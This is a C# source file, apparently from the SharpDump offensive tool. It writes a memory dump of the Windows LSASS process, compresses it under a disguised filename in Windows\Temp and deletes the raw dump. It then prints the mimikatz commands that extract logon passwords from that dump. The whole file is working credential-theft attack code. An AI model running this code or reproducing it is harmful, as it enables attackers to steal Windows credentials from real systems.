using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpDump
{
    public class FileDumper
    {
        // partially adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/

        // Overload supporting MiniDumpExceptionInformation == NULL
        [DllImport(
            "dbghelp.dll", 
            EntryPoint = "MiniDumpWriteDump", 
            CallingConvention = CallingConvention.StdCall, 
            CharSet = CharSet.Unicode, 
            ExactSpelling = true, 
            SetLastError = true)]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess, 
            uint processId, 
            SafeHandle hFile, 
            uint dumpType, 
            IntPtr expParam, 
            IntPtr userStreamParam, 
            IntPtr callbackParam);

        public static void MiniDump(int pid = -1)
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                Process[] processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception ex)
                {
                    // often errors if we can't get a handle to LSASS
                    throw new Exception(ex.Message);
                }
            }

            if (targetProcess.ProcessName == "lsass" && !HighIntegrityAnalyzer.IsHighIntegrity())
            {
                throw new Exception("Not in high integrity, unable to MiniDump!");
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                String str = "Error getting handle to " + targetProcess.ProcessName.ToString() + targetProcess.Id.ToString();
                throw new Exception(str);
            }
            bool bRet = false;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
            string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);

            Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if (bRet)
            {
                FileProcessing(dumpFile, zipFile, targetProcessId, pid);
            }
            else
            {
                throw new ApplicationException("Dump failed");
            }
        }

        public static void FileProcessing(string dumpFile, string zipFile, uint targetProcessId,int pid)
        {
            Console.WriteLine("[+] Dump successful!");
            Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));

            FileCompressor.Compress(dumpFile, zipFile);

            Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
            File.Delete(dumpFile);
            Console.WriteLine("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);

            string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            string OS = "";
            var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            if (regKey != null)
            {
                OS = String.Format("{0}", regKey.GetValue("ProductName"));
            }

            if (pid == -1)
            {
                Console.WriteLine(String.Format("\n[*] Operating System : {0}", OS));
                Console.WriteLine(String.Format("[*] Architecture     : {0}", arch));
                Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
            }
        }

    }
}
